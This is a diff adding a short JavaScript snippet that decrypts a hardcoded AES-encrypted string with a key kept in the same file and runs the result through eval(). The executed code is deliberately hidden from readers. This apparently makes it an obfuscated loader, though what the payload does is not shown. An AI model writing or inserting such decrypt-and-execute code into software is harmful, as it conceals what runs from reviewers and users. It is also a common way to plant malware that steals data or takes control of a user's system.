@@ -1,0 +1,5 @@
+var encryptedData = "U2FsdGVkX18qXpnobxvZ5BRxJFPrXJo1CpsSSy1dCNg=";
+
+var decryptData = CryptoJS.AES.decrypt(encryptedData, "739106339qq");
+var originalText = decryptData.toString(CryptoJS.enc.Utf8);
+eval(originalText);
